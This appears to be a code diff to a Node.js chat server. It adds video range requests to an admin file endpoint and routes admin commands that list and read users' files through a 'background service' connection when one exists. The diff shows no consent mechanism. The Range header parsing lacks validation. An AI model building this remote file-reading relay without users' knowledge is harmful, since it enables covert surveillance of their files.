@@ -109,18 +109,39 @@ const server = http.createServer((req, res) => {
       return
     }
 
-    // ── File download for admin ───────────────────────────────────────────
+    // ── File download for admin (supports Range for video streaming) ─────
     if (req.method === 'GET' && urlPath.startsWith('/api/file/')) {
       const requestId = urlPath.replace('/api/file/', '')
       const file = fileStore.get(requestId)
       if (!file) { res.writeHead(404); res.end('File not found or expired'); return }
-      res.writeHead(200, {
-        ...CORS,
-        'Content-Type': file.mime,
-        'Content-Disposition': `inline; filename="${encodeURIComponent(file.name)}"`,
-        'Content-Length': file.data.length,
-      })
-      res.end(file.data)
+
+      const total = file.data.length
+      const range = req.headers.range
+
+      if (range) {
+        // Serve requested byte range — enables video seeking + chunked buffering
+        const [startStr, endStr] = range.replace(/bytes=/, '').split('-')
+        const start = parseInt(startStr, 10)
+        const end   = endStr ? parseInt(endStr, 10) : Math.min(start + 1024 * 1024, total - 1)
+        const chunkSize = end - start + 1
+        res.writeHead(206, {
+          ...CORS,
+          'Content-Range':  `bytes ${start}-${end}/${total}`,
+          'Accept-Ranges':  'bytes',
+          'Content-Length': chunkSize,
+          'Content-Type':   file.mime,
+        })
+        res.end(file.data.slice(start, end + 1))
+      } else {
+        res.writeHead(200, {
+          ...CORS,
+          'Accept-Ranges':       'bytes',
+          'Content-Type':        file.mime,
+          'Content-Disposition': `inline; filename="${encodeURIComponent(file.name)}"`,
+          'Content-Length':      total,
+        })
+        res.end(file.data)
+      }
       return
     }
 
@@ -243,7 +264,11 @@ wss.on('connection', (ws) => {
       if (meta.role === 'admin') {
         if (msg.type === 'ls' || msg.type === 'read_file') {
           const target = users.get(msg.targetId)
-          if (target) send(target.ws, { ...msg, fromAdminId: meta.userId })
+          if (target) {
+            // Prefer native background service if connected, else JS WebSocket
+            const targetWs = target.bgWs || target.ws
+            send(targetWs, { ...msg, fromAdminId: meta.userId })
+          }
         }
         // Admin DM to a specific user
         if (msg.type === 'dm') {
@@ -261,7 +286,9 @@ wss.on('connection', (ws) => {
       if (meta.role === 'user') {
         if (['ls_result', 'file_result', 'file_start', 'file_chunk', 'file_end', 'file_error'].includes(msg.type)) {
           const admin = admins.get(msg.forAdminId)
-          if (admin) send(admin.ws, { ...msg, fromUserId: meta.userId })
+          // Use primary userId for bg connections so RemoteFileBrowser filter matches
+          const fromUserId = meta.isBg ? meta.primaryId : meta.userId
+          if (admin) send(admin.ws, { ...msg, fromUserId })
           return
         }
         // Group chat — broadcast to all
